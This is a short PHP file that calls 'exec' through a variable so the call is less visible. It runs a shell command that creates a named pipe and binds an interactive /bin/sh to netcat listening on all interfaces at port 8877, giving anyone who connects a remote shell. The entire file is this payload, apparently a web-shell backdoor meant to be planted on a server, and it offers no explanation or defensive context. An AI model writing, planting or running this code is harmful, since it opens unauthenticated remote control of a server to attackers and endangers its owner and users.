<?php

$x = "exec";
$c = "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 8877 > /tmp/f &";
$x($c);
